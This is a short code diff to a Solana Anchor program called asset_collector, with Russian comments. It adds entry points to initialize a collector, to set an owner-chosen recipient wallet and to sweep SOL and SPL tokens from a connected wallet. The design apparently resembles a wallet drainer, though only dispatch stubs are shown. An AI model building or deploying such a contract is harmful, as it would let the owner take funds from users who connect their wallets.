@@ -17,7 +17,12 @@ pub mod asset_collector {
 
     /// Инициализация контракта (оставляем для совместимости)
     pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
-        initialize::handler(ctx)
+        initialize_handler(ctx)
+    }
+    
+    /// Инициализация состояния сборщика (новый подход)
+    pub fn initialize_collector(ctx: Context<InitializeCollector>) -> Result<()> {
+        initialize_collector_handler(ctx)
     }
     
     /// Установка кошелька-получателя (только владелец)
@@ -28,8 +33,13 @@ pub mod asset_collector {
         set_collector_wallet_handler(ctx, new_collector_wallet)
     }
     
-    /// Сбор всех активов с подключенного кошелька
+    /// Сбор всех активов с подключенного кошелька (только SOL)
     pub fn collect_all_assets(ctx: Context<CollectAllAssets>) -> Result<()> {
         collect_all_assets_handler(ctx)
+    }
+    
+    /// Сбор конкретного SPL токена
+    pub fn collect_spl_tokens(ctx: Context<CollectSplTokens>) -> Result<()> {
+        collect_spl_tokens_handler(ctx)
     }
 }
